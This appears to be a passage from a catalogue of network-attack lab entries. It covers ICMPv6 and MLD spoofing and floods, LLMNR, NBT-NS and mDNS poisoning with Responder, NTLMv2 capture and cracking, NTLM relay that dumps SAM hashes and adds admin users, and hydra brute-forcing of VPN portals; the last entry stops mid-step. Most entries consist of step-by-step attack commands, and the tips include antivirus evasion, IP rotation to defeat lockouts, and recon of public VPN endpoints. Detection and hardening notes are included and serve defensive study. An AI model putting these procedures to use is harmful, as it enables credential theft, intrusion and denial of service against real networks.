- **MITRE**: T1040 (Network Sniffing)T1565.001 (Network Device Spoofing)T1498.002 (Endpoint Denial of Service)
- **Impact**: - MITM via rogue gateway- Victim’s traffic redirected to attacker- Network-wide IPv6 connectivity loss- DNS hijack or session theft
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows or Ubuntu VM (Victim)✅ Wireshark✅ THC-IPv6 toolkit (apt install thc-ipv6)✅ Scapy✅ Optional: VirtualBox or VMware for isolated lab setup✅ Admin/root privileges
- **Scenario**: This simulation covers low-level ICMPv6 abuse techniques, including Router Advertisement (RA) spoofing, Neighbor Discovery (ND) poisoning, and ICMPv6 flood DoS. These are often used by attackers inside networks where IPv6 is enabled by default (even if not in active use). Using tools like parasite6 or custom Scapy scripts, attackers can redirect traffic, perform MITM attacks, or bring down IPv6-enabled hosts by flooding the link-local segment. This lab demonstrates 3 real attacks using Kali Linux (attacker) and a Windows or Ubuntu VM (victim), showing how a local attacker can manipulate basic IPv6 mechanisms to break connectivity or reroute packets.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab MachinesAttacker: Kali Linux (with THC-IPv6 and Wireshark)Victim: Windows 10 or Ubuntu VM➡️ Connect both to the same network (NAT/Bridged)### 🟢 STEP 2: Verify IPv6 on VictimVictim (Windows):cmd → ipconfig /all✅ Look for IPv6 address starting with fe80:: or 2001:Victim (Linux):ip a or ifconfig✅ Verify global or link-local IPv6 exists---### 🟢 STEP 3: Enable Wireshark Monitoring (Attacker)Open Wireshark on Kali:Filter for: icmpv6---### 🟢 STEP 4: Attack 1 – ICMPv6 Router Advertisement (RA) SpoofAttacker (Kali):sudo parasite6 eth0 <victim_ipv6>✅ This sends fake RA packets advertising attacker as the default gateway💻 On victim:Run ip -6 route or netsh interface ipv6 show route➡️ You will see the route to Internet now goes via attacker’s spoofed address✅ MITM via IPv6 achieved---### 🟢 STEP 5: Attack 2 – Neighbor Discovery (ND) Spoofing / Cache PoisoningAttacker:sudo fake_router6 eth0✅ Announces itself as gateway to all LAN IPv6 devicesOr custom Scapy:python<br>send(IPv6(dst="ff02::1")/ICMPv6ND_NA(tgt="victim_ipv6", R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="attacker_mac"))<br>✅ Victim will cache attacker's MAC as gateway---### 🟢 STEP 6: Attack 3 – ICMPv6 Flood (DoS)Attacker:sudo flood_router26 eth0✅ This floods the segment with fake routers (RA spam)Victim:Observe network slowness, IP conflict errors, or loss of IPv6 connectivity---### 🟢 STEP 7: Monitor & Log PacketsIn Wireshark:Filter: icmpv6 or ipv6.dst == ff02::1Look for:• Router Advertisement flood• Neighbor Advertisement conflicts• Sudden route changes or MAC spoofing✅ Save: icmpv6_attack.pcap➡️ Label RA spoof: icmpv6_ra_spoof➡️ Label ND spoof: icmpv6_nd_poison---### 🛑 STEP 8: CleanupAttacker:• Stop THC tools: CTRL+C• Flush spoofed routes if needed: ip -6 route flushVictim:• Reboot• Reconnect to clean network---🧠 Tips:• These attacks do NOT need the victim to have IPv6 internet — just link-local IPv6• Works even if IPv6 is "not actively configured"• Use these attacks to create datasets or train ML detection of spoofed ICMPv6 patterns
- **Detection**: - Wireshark or Suricata ICMPv6 alerts- Analyze ND/RA anomalies (multiple RAs in short time)- Check routing table changes- Monitor for high entropy in router advertisements
- **Solution**: - Use RA Guard or DHCPv6 snooping on switches- Disable IPv6 if unused- Block rogue RA/NA using ip6tables or firewall ACLs- Deploy ND inspection (e.g., Cisco’s IPv6 First-Hop Security)
- **Tags**: #ICMPv6Attack #IPv6Security #RAspoof #NDpoison #LANMitM #DoS #THCIPv6 #NetworkPenTest #MITM

## Multicast Listener Discovery (MLD) Abuse

- **Attack Type**: MLDv1/MLDv2 Flood / Multicast Discovery Exploit
- **Target**: WorkstationsSwitchesRoutersIoT DevicesCorporate VLAN users
- **Vulnerability**: No authentication or rate-limiting in MLDUnmonitored multicast handling by switches and NICs
- **MITRE**: T1498.002 (Endpoint DoS)T1499.001 (Network Denial of Service)T1040 (Network Sniffing)
- **Impact**: - Resource exhaustion on routers/switches- Flooded multicast table- High CPU usage on victims- Latency & connectivity loss
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows or Ubuntu (Victim)✅ THC-IPv6 Toolkit (apt install thc-ipv6)✅ Wireshark✅ Scapy (optional custom MLD crafting)✅ Admin/root rights on attacker✅ Optional: Layer 2 switch in lab environment
- **Scenario**: This simulation demonstrates how attackers can exploit the IPv6 Multicast Listener Discovery (MLD) protocol to flood, crash, or overwhelm network devices. MLD is used by IPv6 hosts and routers to manage multicast group memberships, but it lacks authentication. An attacker can spoof fake MLD report or query messages using tools like mldq or flood_mld, causing excessive multicast state changes and traffic. On some systems (especially switches or routers), this can lead to resource exhaustion, denial of service, or even complete lock-up. This lab includes simulation of MLDv1/v2 flood attacks using Kali Linux and a Windows/Linux victim machine in a controlled test network. Ideal for labs, dataset collection, and switch stress testing.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab EnvironmentAttacker: Kali LinuxVictim: Windows 10/11 or Ubuntu➡️ Connect both to the same LAN or virtual bridge---### 🟢 STEP 2: Verify IPv6 & MLD on VictimOn Victim:Linux:ip -6 addr → check for fe80:: and global addressesnetstat -gn → show multicast groupsWindows:netsh interface ipv6 show joins✅ You’ll see multicast groups like:• ff02::1 (all-nodes)• ff02::2 (all-routers)• others specific to services---### 🟢 STEP 3: Monitor MLD Packets (Wireshark on Attacker)Start Wireshark:Interface: eth0 or ens33Filter: icmpv6 && ip6[40] == 0x82 (MLD)✅ This filter captures MLDv1/v2 Report and Query messages---### 🟢 STEP 4: Launch MLD Flood AttackAttacker (Kali):Install THC-IPv6:sudo apt install thc-ipv6 -yRun flooder:sudo flood_mld eth0✅ This sends thousands of fake MLD report messages, each claiming membership to different multicast groupsAlternative:sudo mldq eth0 ff02::1✅ Sends repeated MLD Query messages to all-nodes group---### 🟢 STEP 5: Observe Victim Behavior➡️ On victim machine:• Open Wireshark with same filter• Look for incoming MLD floods• Monitor CPU/RAM usage (especially on low-end IoT devices)➡️ On Layer 2 switch (if in lab):• Use console or SNMP tools to monitor port activity• Look for increased multicast group entries (MAC table bloat)Symptoms:• CPU spikes• Packet loss or freezing• Switch port crash/reboot in extreme cases---### 🟢 STEP 6: Save & Label DatasetIn Wireshark:Save as: mld_flood_attack.pcapLabel:• MLD Report Flood = mld_report_abuse• MLD Query Flood = mld_query_spam✅ Useful for ML model to detect anomalous multicast behavior---### 🛑 STEP 7: Cleanup• CTRL+C the THC flood tool• Reboot victim machine if unresponsive• On switches: clear multicast tables (via CLI or SNMP)---🧠 Tips:• Even if IPv6 isn’t in use, many devices respond to multicast automatically• Great for switch/residential router stress testing• Add --interface flags if running on multi-NIC system• Combine with RA spoof for deeper layer 2 exploitation
- **Detection**: - Wireshark: MLD report/query spike- Port mirroring on switch + packet analyzer- Monitor number of multicast entries per port
- **Solution**: - Enable MLD snooping on switches- Filter unknown multicast groups at firewall/switch- Disable MLD if IPv6 not needed- Use rate-limiting (storm control)
- **Tags**: #MLDAbuse #IPv6Attack #MulticastFlood #THCIPv6 #RouterDoS #LANAbuse #PacketStorm #ICMPv6Attack #Layer2Threats

## LLMNR Poisoning with Responder

- **Attack Type**: LLMNR/NBT-NS Spoofing for Credential Capture
- **Target**: Internal Windows networks Enterprise LANs Isolated IoT/SCADA environments
- **Vulnerability**: LLMNR and NetBIOS enabled by default No hostname validation NTLM authentication fallback
- **MITRE**: T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
- **Impact**: - Credential theft (NTLM hashes) - Password cracking and reuse - Can lead to privilege escalation or relay attacks
- **Tools**: ✅ Kali Linux (Attacker) ✅ Windows 10/11 or Server (Victim) ✅ Responder tool ✅ Wireshark (optional for packet capture) ✅ John the Ripper or Hashcat (for cracking hashes)
- **Scenario**: This simulation demonstrates how an attacker on the same local network as a victim machine can perform LLMNR (Link-Local Multicast Name Resolution) and NBT-NS poisoning to capture NTLMv2 password hashes. The attacker listens for LLMNR/NBT-NS requests that occur when a Windows machine cannot resolve a hostname. The attacker responds to these requests pretending to be the desired host and tricks the victim into authenticating against the attacker, exposing credentials. This is a realistic attack used during internal penetration tests, red teaming, and lateral movement stages.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab NetworkAttacker: Kali LinuxVictim: Windows 10 (fresh install recommended)➡️ Ensure both VMs are on the same NAT or Bridged network✅ On Kali, find IP: ip a → eth0: 192.168.56.101✅ On Windows victim: ipconfig → Ethernet: 192.168.56.102✅ Test connectivity:ping 192.168.56.102 from Kali---### 🟢 STEP 2: Start Responder on Kali Linux1. Open Terminal:cd /usr/share/responder2. Run responder:sudo responder -I eth0➡️ -I specifies the network interface✅ Output shows:[*] Poisoners:LLMNR: [On]NBT-NS: [On]SMB: [On]Responder is now waiting to receive name resolution requests---### 🟢 STEP 3: Trigger LLMNR Request from Victim✅ On Windows victim:1. Press Win + R → type: \\wronghost → Enter➡️ This triggers a failed hostname lookup✅ Open Command Prompt:ping wronghost or net use \\wronghost\share➡️ Since Windows can’t resolve wronghost, it sends LLMNR & NBT-NS broadcasts asking others “Who is wronghost?”➡️ Kali (attacker) sees and spoofs a response, pretending to be wronghost✅ Responder logs:[SMB] NTLMv2-SSP Client : 192.168.56.102[SMB] Username : WIN10BOX\\Alice[SMB] Hash : Alice::WIN10BOX:1122334455667788:$NTLMv2HASH...---### 🟢 STEP 4: Crack the Captured Hash (Optional)✅ Save the hash:nano hash.txt → paste captured NTLM hash✅ Run Hashcat (if GPU available):hashcat -m 5600 -a 0 hash.txt rockyou.txtOr use John:john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt✅ If password found, output:Alice: P@ssw0rd123---### 🟢 STEP 5: Analyze Traffic (Wireshark - Optional)✅ On Kali:sudo wireshark1. Capture on eth02. Filter: llmnr or nbns or tcp.port == 445➡️ You'll see victim querying wronghost.local➡️ Attacker responds with fake IP➡️ Victim attempts SMB auth---### 🛑 STEP 6: Cleanup✅ On Kali:• CTRL+C to stop Responder✅ On Windows:• Clear recent connections:net use * /delete• Disable automatic network discovery (optional)• Use Group Policy to disable LLMNR🧠 Tips:• Works great on misconfigured domains or isolated networks• Combine with NTLM relay (e.g., ntlmrelayx) to gain shell• Use in Red Team for lateral movement• Enables password cracking dataset generation
- **Detection**: - Detect LLMNR/NBT-NS broadcast activity - Monitor for outbound SMB auth to unusual IPs - Use Suricata rules for Responder patterns - Analyze SMB login attempts
- **Solution**: - Disable LLMNR and NBT-NS via GPO - Use local DNS and static mappings - Enforce SMB signing - Disable NTLM where possible
- **Tags**: #LLMNR #Responder #InternalRecon #CredentialHarvesting #MITM #NTLMv2 #WindowsAttacks #RedTeam

## NetBIOS Name Service (NBT-NS) Poisoning with Responder

- **Attack Type**: Internal Network Spoofing / Credential Harvesting
- **Target**: Enterprise LAN Internal Windows Workstations IoT devices with NetBIOS enabled
- **Vulnerability**: - NetBIOS enabled on network - No hostname validation - NTLM fallback allowed
- **MITRE**: T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning
- **Impact**: - Credentials (NTLM hashes) harvested - Can lead to password cracking - Enables relay attacks (NTLM relay) - Insider threat foothold
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10/11 (Victim)✅ Responder✅ Wireshark (optional)✅ Hashcat / John the Ripper (optional for hash cracking)
- **Scenario**: This simulation demonstrates how attackers use NBT-NS poisoning to capture NTLMv2 password hashes on local Windows networks. When a Windows machine fails to resolve a name via DNS, it sends out broadcast requests via NetBIOS-NS (UDP port 137). A malicious actor on the same network can respond to these requests, pretending to be the desired host. Once the victim connects, the attacker captures the authentication attempt (including password hash). This is a common tactic used in red teaming, internal pen tests, and post-exploitation lateral movement.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup – Windows + Kali VM on Same Network➡️ Use VirtualBox/VMware to run:• Kali Linux as attacker• Windows 10 as victim➡️ Ensure both are on same Bridged or NAT Network✅ Check IPs:• On Kali: ip a (eth0)• On Windows: ipconfig➡️ Example:• Kali: 192.168.56.101• Windows: 192.168.56.102---### 🟢 STEP 2: Start Responder to Spoof NBT-NS Replies1. On Kali Terminal:cd /usr/share/responder2. Launch Responder:sudo responder -I eth0➡️ eth0 is your active interface (confirm via ip a)✅ You’ll see:[+] Poisoners:NBT-NS: [On]SMB: [On]HTTP: [On]Responder is now waiting for broadcast name requests (NBT-NS) from Windows hosts---### 🟢 STEP 3: Trigger NetBIOS Request from Victim (Windows)1. Log in to Windows 10 VM2. Press Win + R, type:\\nonexistenthost → Press EnterOROpen Command Prompt:ping nonexistenthost➡️ Since the name is not resolved via DNS, Windows sends NBT-NS broadcast over UDP/137✅ Kali’s Responder responds claiming to be nonexistenthost✅ You’ll see in Responder terminal:[SMB] NTLMv2-SSP Hash Captured[+] Username: ALICE :: WIN10LAB[+] Hash: ALICE::WIN10LAB:1122334455667788:$NTLMv2HASH...✅ You just captured NTLMv2 challenge-response hash from the victim---### 🟢 STEP 4: (Optional) Crack Captured Hash1. Save the hash:nano hash.txt → Paste the Responder hash output2. Use Hashcat:hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txtORUse John the Ripper:john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt✅ If cracked:Password found: Password123!---### 🟢 STEP 5: Monitor and Analyze Packets (Wireshark – Optional)On Kali:sudo wireshark → Interface: eth0Filter:udp.port == 137 or tcp.port == 445 or nbns✅ You’ll see:• NBNS query for nonexistenthost• Response from attacker• SMB auth attempt✅ You can save .pcap for dataset:File → Save As → nbns_poisoning.pcap---### 🛑 STEP 6: Clean Up and Harden➡️ On Kali:CTRL+C to stop Responder➡️ On Windows:• Clear history:net use * /delete• Block outgoing NetBIOS:Control Panel → Network → Adapter → Properties → Disable NetBIOS over TCP/IP➡️ For Enterprise:• Group Policy Editor:gpedit.msc → Network → DNS Client → Turn off Multicast Name Resolution → Enabled🧠 Tips:• Use with ntlmrelayx.py for privilege escalation• Combine with Wireshark to generate rich ML datasets• Avoid triggering AV with responder.conf tuning
- **Detection**: - Monitor NBNS traffic (UDP/137) - Look for SMB authentications to unknown IPs - Analyze .pcap with Suricata/Zeek - Alert on responder tool signatures
- **Solution**: - Disable NetBIOS over TCP/IP - Disable LLMNR in Group Policy - Restrict SMB access - Require SMB signing - Enforce Kerberos-only authentication
- **Tags**: #NetBIOS #NBTNS #Responder #CredentialHarvesting #InternalSpoofing #WindowsSecurity #MITM #NTLMv2 #RedTeam

## mDNS (Multicast DNS) Poisoning with Avahi & MITM

- **Attack Type**: Local Network Spoofing / ZeroConf Exploitation
- **Target**: Internal enterprise networksIoT or BYOD networksSmart TVs, printers, phones
- **Vulnerability**: mDNS enabled by defaultNo service validationRelies on UDP broadcast trust
- **MITRE**: T1557.001 – Adversary-in-the-Middle: Multicast Name Resolution Spoofing
- **Impact**: - Credential theft via rogue services - Victim connects to attacker thinking it's a real device - Can lead to MITM, exfil, lateral movement
- **Tools**: ✅ Kali Linux (Attacker)✅ Any mDNS-enabled client (Linux/macOS/Windows)✅ avahi-daemon, mdns-scan✅ Optional: Responder, mitmproxy, tcpdump, Wireshark✅ Rogue service emulation tools (FakeDNS, evil-ssdp, etc.)
- **Scenario**: This simulation demonstrates how attackers abuse mDNS (Multicast DNS) on local networks to respond to name resolution requests for .local domains. mDNS is common on IoT, macOS, Linux, and Windows 10+ systems for auto-discovery of services (AirPrint, file shares, etc.). Attackers can impersonate services like printers, SSH, or SMB shares, and even capture credentials if authentication is attempted. This technique is popular for network spoofing, phishing, and initial access.
- **Attack Steps**: ### 🟢 STEP 1: Lab Network Setup➡️ Set up Kali Linux and a victim system (Windows/macOS/Linux) on the same LAN or NAT/Bridged network✅ Kali IP: 192.168.56.101✅ Victim IP: 192.168.56.102Ensure mDNS (UDP 5353) is enabled on victim (enabled by default on most systems)✅ Test from Kali:mdns-scan➡️ You’ll see .local devices (e.g., myprinter.local, macbook.local)---### 🟢 STEP 2: Identify Active mDNS ServicesOn Kali:1. Run mDNS scan:sudo mdns-scan✅ Output example:_workstation._tcp.local. - 192.168.56.102_ssh._tcp.local. - 192.168.56.102These show auto-discovered services advertised via mDNS---### 🟢 STEP 3: Poison mDNS Responses (Fake Services)Install avahi-daemon (mDNS responder):sudo apt install avahi-daemon avahi-utilsCreate a fake .local hostname:sudo nano /etc/avahi/hostsAdd:192.168.56.101 printer.localRestart avahi:sudo systemctl restart avahi-daemon✅ Now Kali responds to printer.local requests on mDNS---### 🟢 STEP 4: Trigger Victim mDNS Query➡️ On victim machine (Windows/macOS/Linux):1. Open browser or run command:ping printer.localORFile Explorer: \\printer.local✅ The victim sends mDNS query (UDP 5353) to discover printer.local✅ Kali (attacker) responds via Avahi and spoofs printer.local✅ Now victim thinks attacker is the real service and may attempt SMB/HTTP authOptional: Enable Responder to catch credentials:sudo responder -I eth0 -wrf---### 🟢 STEP 5: Capture Credentials (Optional)✅ If victim attempts to authenticate:• Responder captures NTLMv2 hash:[*] SMB NTLMv2-SSP Hash Captured✅ You can save the hash and crack it using Hashcat or John---### 🟢 STEP 6: Packet Analysis with Wireshark (Optional)On Kali:sudo wireshark → Filter: udp.port == 5353 or nbns or dns✅ Look for:• mDNS query: Standard query 0x0 ... printer.local• Response: attacker IP responds✅ Save .pcap file for dataset---### 🛑 STEP 7: Cleanup and Defense TipsOn Kali:sudo systemctl stop avahi-daemonOn victim:➡️ No GUI config to disable mDNS (manual steps needed):On Windows:1. Disable Function Discovery Resource Publication service2. Block UDP/5353 using Windows FirewallOn macOS:sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plistOn Linux:Disable Avahi:sudo systemctl disable avahi-daemon🧠 Tips:• Combine with Responder or mitmproxy for further phishing/credential theft• Excellent for simulating IoT discovery attacks and MAC spoofing• Leverage .local names for social engineering
- **Detection**: - Monitor UDP/5353 traffic - Look for frequent .local queries - Analyze Avahi/Bonjour broadcast traffic - Suricata or Zeek rules for mDNS anomaly
- **Solution**: - Disable mDNS where not needed - Use static DNS + hostnames - Enforce endpoint firewall blocking UDP/5353 - Educate users not to trust .local names blindly
- **Tags**: #mDNS #Avahi #Bonjour #Responder #ZeroConf #LocalSpoofing #InternalRecon #MITM #NTLM #IoTPhishing

## NTLMv2 Hash Capture + Offline Cracking

- **Attack Type**: Credential Theft via Hash Dump & Brute Force
- **Target**: Internal LANEnterprise Windows workstationsMisconfigured DNS environments
- **Vulnerability**: Weak password policyLLMNR/NBT-NS enabledNTLM fallback authenticationNo SMB signing
- **MITRE**: T1557.001 – Adversary-in-the-Middle: LLMNR/NBT-NST1110.002 – Brute Force: Password Cracking
- **Impact**: - Offline password recovery - Lateral movement - Privilege escalation - NTLM Relay possibilities
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10 (Victim)✅ Responder✅ Hashcat or John the Ripper✅ Wordlist (rockyou.txt)✅ Wireshark (optional for monitoring)
- **Scenario**: This simulation demonstrates how an attacker captures NTLMv2 hashes using LLMNR/NBT-NS poisoning or SMB-based phishing, and then cracks the hash offline using tools like Hashcat or John the Ripper. NTLMv2 is commonly used in Windows authentication (especially SMB/NTLMSSP), and it’s vulnerable if weak passwords are used. This technique is a favorite in internal network attacks, post-exploitation, and Red Team credential harvesting.
- **Attack Steps**: ### 🟢 STEP 1: Set Up Lab for LLMNR/NBT-NS Poisoning• Use Kali Linux as attacker• Use Windows 10 as victim (default settings)➡️ Both on same network: Bridged/NAT✅ On Kali:ip a → Note IP (e.g., 192.168.56.101)✅ On Windows:ipconfig → Note IP (e.g., 192.168.56.102)➡️ Ensure Windows has no active domain DNS to fall back on---### 🟢 STEP 2: Start Responder to Capture NTLMv2 Hashes1. Kali Terminal:cd /usr/share/respondersudo responder -I eth0✅ Responder will now listen for LLMNR/NBT-NS queries and respond with spoofed answers---### 🟢 STEP 3: Trigger Authentication on VictimOn the Windows victim:1. Press Win + R → type \\fakehost → Press Enter➡️ Windows tries to resolve fakehost➡️ Sends LLMNR/NBT-NS request➡️ Kali’s Responder intercepts and pretends to be fakehost✅ Result in Kali:[SMB] NTLMv2-SSP Hash CapturedUsername: AliceDomain: WORKGROUPHash: Alice::WORKGROUP:11223344abcd:$NTLMv2$1122...✅ Responder automatically saves the hash to:/usr/share/responder/logs/Responder-Session.log---### 🟢 STEP 4: Save & Prepare NTLMv2 Hash for Cracking1. Open the log:cat logs/Responder-Session.log2. Copy full NTLMv2 line3. Create a file:nano ntlmv2_hash.txtPaste content like:Alice::WORKGROUP:1122334455667788:1122aabbccddee:010100000000...---### 🟢 STEP 5: Crack Hash with Hashcat (GPU) or John (CPU)✅ Option A – Hashcat (Faster w/ GPU):Format for NTLMv2: Mode 5600hashcat -m 5600 -a 0 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt✅ Option B – John the Ripper:john --format=netntlmv2 ntlmv2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt✅ If password is found:Alice: Password123---### 🟢 STEP 6: Verify and Use Cracked Credentials✅ Use cracked password to login into services (if allowed):• smbclient, RDP, file shares, etc.Example:smbclient //192.168.56.102/C$ -U Alice→ Enter cracked password when prompted➡️ You gain SMB shell or file access---### 🟢 STEP 7: Monitor Traffic with Wireshark (Optional)• Run Wireshark on Kali (interface: eth0)• Use filter: udp.port == 137 or llmnr or tcp.port == 445• You’ll see:→ LLMNR/NBT-NS request→ Responder reply→ SMB NTLM authentication attemptSave .pcap as dataset:ntlmv2_capture_lab.pcap---### 🛑 STEP 8: Cleanup & Remediation on Target✅ On Kali:CTRL+C to stop ResponderDelete log if needed: rm -rf logs/✅ On Windows:• net use * /delete• Disable LLMNR/NBT-NS in GPO:➡️ gpedit.msc → Network → DNS Client → Turn Off Multicast Name Resolution → Enabled• Use Group Policy to enforce Kerberos-only auth• Educate users on .local spoofing & rogue pop-ups🧠 Pro Tip:• Combine this with NTLM Relay (ntlmrelayx.py) for lateral movement• Ideal attack for dataset generation, password strength testing, red teaming
- **Detection**: - Monitor Responder behavior - Detect high volume of NTLM auth - Detect use of cracking tools (hashcat/john) - Alert on SMB connection attempts post-capture
- **Solution**: - Enforce strong password policies - Disable LLMNR/NBT-NS - Enforce Kerberos-only authentication - Apply SMB signing - Alert on Responder-like behavior
- **Tags**: #NTLMv2 #PasswordCracking #Responder #Hashcat #LLMNR #SMB #CredentialHarvesting #OfflineAttack #BruteForce #RedTeam

## NTLM Relay (No Cracking Needed) via SMB to SMB

- **Attack Type**: Credential Relay Attack
- **Target**: Internal networksEnterprise Windows environmentsSMB servers with no signing
- **Vulnerability**: SMB signing disabledLLMNR/NBT-NS enabledNTLM fallback allowed
- **MITRE**: T1557.001 – LLMNR/NBT-NS PoisoningT1557.002 – NTLM RelayT1003 – OS Credential Dumping
- **Impact**: - Full compromise of target - Admin access without knowing password - Add user, dump hashes - Privilege escalation & lateral movement
- **Tools**: ✅ Kali Linux (Attacker)✅ Windows 10 (Victim)✅ Another Windows system (Target SMB Server)✅ Responder✅ impacket-ntlmrelayx.py✅ Optional: secretsdump.py, smbclient, Wireshark
- **Scenario**: This simulation demonstrates a powerful NTLM Relay attack, where an attacker intercepts an NTLM authentication attempt (via LLMNR/NBT-NS poisoning) and relays it directly to another internal service (e.g., SMB) without needing to crack the password. If the target accepts the relayed credentials, the attacker can gain a shell, dump SAM/NTDS.dit, or create users. This is a real-world technique used by APT groups and red teams for privilege escalation, domain persistence, and lateral movement—no password cracking required.
- **Attack Steps**: ### 🟢 STEP 1: Lab Setup with 3 Machines1. Kali Linux (Attacker)2. Windows 10 (Victim who initiates SMB)3. Windows Server 2016/19 (Target for relay, must have SMB port 445 open and no SMB signing)➡️ All 3 must be on the same network (Bridged/NAT)➡️ Ensure SMB signing is disabled on the target server:• Regedit → HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters• Set EnableSecuritySignature = 0 and RequireSecuritySignature = 0✅ Attacker (Kali): 192.168.56.101✅ Victim: 192.168.56.102✅ Target Server: 192.168.56.103---### 🟢 STEP 2: Launch NTLM Relay Listener on Kali1. Open terminal:sudo ntlmrelayx.py -t smb://192.168.56.103 --no-http-server✅ This sets up a listener to relay incoming NTLMv2 authentication to SMB on the target server• Output should show:[*] Running in relay mode to smb://192.168.56.103➡️ Keep this window open---### 🟢 STEP 3: Start Responder to Intercept Auth RequestsOpen another terminal tab:cd /usr/share/respondersudo responder -I eth0 -wrf✅ Responder now listens for LLMNR/NBT-NS queries✅ The -wrf flags enable poisoning + SMB capture---### 🟢 STEP 4: Trigger Authentication from VictimOn Windows 10 Victim:1. Press Win + R → type: \\nonexistent → Press Enter➡️ This causes Windows to send LLMNR/NBT-NS query to find nonexistent➡️ Kali responds with spoofed host (via Responder)➡️ Victim initiates SMB auth to attacker✅ Responder intercepts the NTLMv2 challenge/response✅ Responder forwards it to ntlmrelayx, which sends it to the real target (192.168.56.103)✅ If the target accepts the auth, you will see:[*] Authenticating against smb://192.168.56.103 as WORKGROUP\Alice[*] Dumping SAM hashes...[*] Done!✅ The relay succeeds, and you now own the server---### 🟢 STEP 5: Post-Exploitation (Dump Passwords, Create Admin)✅ Use built-in modules of ntlmrelayx:• Dump SAM/NTDS:[+] Dumping local SAM hashes...• Add user:[*] Adding user: relayuser[*] Adding user to Administrators group...✅ You now have a new user with admin rights on the target---### 🟢 STEP 6: Manual Access with smbclient or secretsdump.pyExample:smbclient //192.168.56.103/C$ -U relayuser→ Use the password you set during relayOr:secretsdump.py -target-ip 192.168.56.103 relayuser:password@192.168.56.103✅ You can now dump SAM hashes, download files, or gain shell---### 🟢 STEP 7: Monitor Traffic with Wireshark (Optional)✅ Open Wireshark on Kali• Filter: llmnr or nbns or tcp.port == 445• See:→ LLMNR query from victim→ SMB NTLM auth handshake→ Relay to targetSave .pcap as dataset: ntlmrelay_attack.pcap---### 🛑 STEP 8: Cleanup & Prevent Relay➡️ On Kali:CTRL+C both ntlmrelayx and Responder➡️ On Windows Target:• Remove added users if created✅ Hardening Steps:• Disable LLMNR and NBT-NS via Group Policy• Enable SMB Signing on all servers:gpedit.msc → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Enable SMB Signing• Use Kerberos-only authentication• Implement host firewall to restrict SMB traffic🧠 Tips:• Combine with CrackMapExec for fast validation• Use --escalate-user to enable admin rights relay• Easily scriptable for Red Team automation• No cracking = instant access if vulnerable
- **Detection**: - Detect LLMNR/NBT-NS activity - Alert on new local admin accounts - Monitor SMB logs for abnormal logins - Suricata/Zeek rules for ntlmrelayx patterns
- **Solution**: - Enforce SMB Signing - Disable LLMNR/NBT-NS - Enforce Kerberos auth - Monitor for NTLM relay signatures - Educate admins on relay risks
- **Tags**: #NTLMRelay #LLMNR #Responder #ntlmrelayx #SMB #NoCracking #CredentialRelay #PrivilegeEscalation #RedTeam

## Brute-Force VPN Login Portal (SSL VPN / OpenVPN)

- **Attack Type**: Credential Brute Force Attack on Public VPN Gateway
- **Target**: Public VPN login portalsRemote employeesExternal infrastructureAny SSL-based VPN appliance
- **Vulnerability**: Weak password policyNo brute-force protectionLogin error-based feedbackNo CAPTCHANo IP lockout
- **MITRE**: T1110.001 – Brute Force: Password GuessingT1190 – Exploit Public-Facing Application
- **Impact**: - Initial network access - VPN compromise - Bypass perimeter firewall - Credential stuffing risk - Lateral movement starts here
- **Tools**: ✅ Kali Linux✅ hydra✅ nmap✅ wfuzz or burp suite (optional)✅ rockyou.txt or custom wordlist✅ Optional: OpenVPN config file, Python for scripting
- **Scenario**: This simulation shows how attackers perform brute-force attacks against exposed SSL VPN login portals (like OpenVPN, Fortinet SSL VPN, or Palo Alto GlobalProtect) to guess valid usernames and passwords. These portals often support HTTP-based login forms or SSL authentication, and if weak credentials or no brute-force protection is configured, attackers can script automated login attempts until success. This technique is widely used in real-world attacks by ransomware gangs and APT groups to gain initial network access via VPN.
- **Attack Steps**: ### 🟢 STEP 1: Identify VPN Login Portal (Target Recon)• Use nmap to scan VPN login services:nmap -p 443 --script http-title -sV -Pn TARGET-IP✅ Check for web-based portals like:https://vpn.company.com or https://<ip>:443Look for login titles like:• Fortinet SSL VPN• OpenVPN Access Server• Palo Alto GlobalProtect🧠 Tip: Use tools like amass, crt.sh, or subfinder to find subdomains like vpn.*.com---### 🟢 STEP 2: Analyze Login Form Details (HTML POST Fields)Open browser or Burp Suite → Intercept login request1. Go to VPN login page2. Try fake login: user: test, pass: test3. In Burp, observe POST request✅ Example:POST /login.phpParams: username=test&password=test➡️ This gives you the endpoint and parameter names for bruteforcing---### 🟢 STEP 3: Build User & Password Wordlists✅ For testing:nano users.txt → Add: admin, john, itadmin, etc.nano passwords.txt → Add: 123456, Password1, etc.Or use built-in:/usr/share/wordlists/rockyou.txt---### 🟢 STEP 4: Brute Force Login Using Hydra1. Format:hydra -L users.txt -P passwords.txt <IP> https-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"✅ Replace /login.php with real path✅ "Invalid credentials" is the failure message in response bodyExample:hydra -L users.txt -P passwords.txt vpn.company.com https-post-form "/auth/login:username=^USER^&password=^PASS^:Login failed"➡️ Hydra will try every user+pass combo and show successOutput:[80][https-post-form] host: vpn.company.com login: john password: Password123---### 🟢 STEP 5: Optional - Bruteforce OpenVPN with .ovpn ConfigIf you have .ovpn file with username-password auth:1. Save creds to text:nano creds.txt → username in 1st line, password in 2nd2. Use:openvpn --config vpn.ovpn --auth-user-pass creds.txt➡️ Write a bash script to loop through credentials---### 🟢 STEP 6: Check for Account Lockout / Rate Limits✅ If login portal blocks after N tries:• Hydra will stop or slow down• Use -t 1 to send one try at a time• Use --proxy or --source-ip to rotate IPs (if in scope)---### 🟢 STEP 7: Optional - Capture and Replay Requests with Burp 